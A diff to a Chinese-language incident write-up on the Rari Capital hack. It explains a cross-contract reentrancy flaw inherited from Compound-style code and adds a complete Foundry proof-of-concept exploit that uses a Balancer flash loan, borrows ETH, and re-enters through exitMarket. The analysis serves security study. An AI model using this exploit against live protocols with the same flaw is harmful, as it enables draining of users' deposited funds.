@@ -7,7 +7,7 @@ Rari Capital 攻击事件的 分析和复现
 
 漏洞原理与去年我分析过的`Cream 第四次被黑`类似, 但攻击方式更加优雅, 故有此文.
 
-### 漏洞源头: Compound起的坏头
+### 漏洞起因: Compound起的坏头
 
 老牌Defi借贷项目`Compound`在代码实现上存在兼容性问题, 没有遵循`check-effect-interaction`原则, 简单用人话翻译就是, 针对借贷场景,没有做到`先记账, 再转账` 
 
@@ -59,6 +59,13 @@ https://etherscan.io/address/0xd77e28a1b9a9cfe1fc2eee70e391c05d25853cbf#code
 ![image](https://user-images.githubusercontent.com/33406415/168264843-d036f4d6-b8d1-4b47-8ffb-03afad810d01.png)
 
 
+### 重入锁的局限性
+
+`nonreentrant`可以有效的抵御单一合约在单一transaction中的重入风险.
+但是对于由多合约构造的复杂应用, 重入锁并不能起到足够的作用.
+A合约的a函数和B合约的b函数即使都加了重入锁，攻击者依然可以通过A合约的a函数去重入B合约的b函数. 
+
+
 ### 仿盘的自我修养
 
 近一年的时间里, 仿盘们或浑然不知, 或修修补补, 有的项目方给几乎所有核心函数增加`nonReentrant`防重入锁, 以为万事大吉.
@@ -71,6 +78,10 @@ https://etherscan.io/address/0x28192abdb1d6079767ab3730051c7f9ded06fe46#code
 ```
 
 ![image](https://user-images.githubusercontent.com/33406415/168264863-e01bfa2d-a96b-4c13-9bdd-741f59802444.png)
+
+
+
+
 
 ### 复现方法
 
@@ -85,3 +96,113 @@ forge test -vvv --fork-url $eth --fork-block-number 14684813
 
 
 <img width="600" alt="image" src="https://user-images.githubusercontent.com/33406415/168168303-d6fadeb3-c983-46f1-bb58-61e31c554eab.png">
+
+
+### 核心攻击代码
+
+```js
+    function test() public{
+
+        // 前置准备操作1: 查看 fETH_127 中有多少ETH可以借  
+        emit log_named_uint("ETH Balance of fETH_127 before borrowing",address(fETH_127).balance/1e18);
+
+        // 前置准备操作2: 因为forge的测试地址上本身有很多的ETH 
+        // 所以先把他们都转走, 方便查看攻击所得ETH数量
+        payable(address(0)).transfer(address(this).balance);
+
+        emit log_named_uint("ETH Balance after sending to blackHole",address(this).balance);
+
+        // 第一步, 从balancer中通过闪电贷借1500万的USDC
+        // 攻击者其实借了1.5亿, 但其实1500万就可以
+        // 但是balancer的闪电贷是不收手续费的, 所以借多少都无所谓
+
+        address[] memory tokens = new address[](1);
+
+        tokens[0] = address(usdc);
+
+        uint[] memory amounts = new uint[](1);
+
+        amounts[0] =  150000000*10**6;
+
+        vault.flashLoan(address(this), tokens, amounts, '');
+
+    }
+
+    function receiveFlashLoan(
+        IERC20[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    )
+        external
+    {
+        // 没有下面四行会有恶心的warning
+        tokens;
+        amounts;
+        feeAmounts;
+        userData;
+        // 查看是否成功借到了1500万的USDC
+
+        uint usdc_balance = usdc.balanceOf(address(this));
+        emit log_named_uint("Borrow USDC from balancer",usdc_balance);
+
+        // 第二步, 调用fusdc_127的mint函数, 
+        // 完成usdc的质押操作
+
+        usdc.approve(address(fusdc_127), type(uint256).max);
+
+        fusdc_127.accrueInterest();
+
+        fusdc_127.mint(15000000000000);
+
+        uint fETH_Balance = fETH_127.balanceOf(address(this));
+
+        emit log_named_uint("fETH Balance after minting",fETH_Balance);
+
+        usdc_balance = usdc.balanceOf(address(this));
+
+        emit log_named_uint("USDC balance after minting",usdc_balance);
+
+        // 第三步, 调用 Unitroller 的 enterMarkets函数
+
+        address[] memory ctokens = new address[](1);
+
+        ctokens[0] =  address(fusdc_127);
+
+        rari_Comptroller.enterMarkets(ctokens);
+
+        // 第四步, fETH_127 的borrow函数, 借1977个ETH
+
+        fETH_127.borrow(1977 ether);
+
+        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing",address(fETH_127).balance/1e18);
+
+        emit log_named_uint("ETH Balance of me after borrowing",address(this).balance/1e18);
+
+        usdc_balance = usdc.balanceOf(address(this));
+
+        fusdc_127.approve(address(fusdc_127), type(uint256).max);
+
+        fusdc_127.redeemUnderlying(15000000000000);
+
+        usdc_balance = usdc.balanceOf(address(this));
+
+        emit log_named_uint("USDC balance after borrowing",usdc_balance);
+
+        // 第五步, 把1500万的USDC还给balancer
+
+        usdc.transfer(address(vault), usdc_balance);
+
+        usdc_balance = usdc.balanceOf(address(this));
+
+        emit log_named_uint("USDC balance after repayying",usdc_balance);
+    }
+
+
+    receive() external payable {
+
+        rari_Comptroller.exitMarket(address(fusdc_127));
+
+    }
+
+```
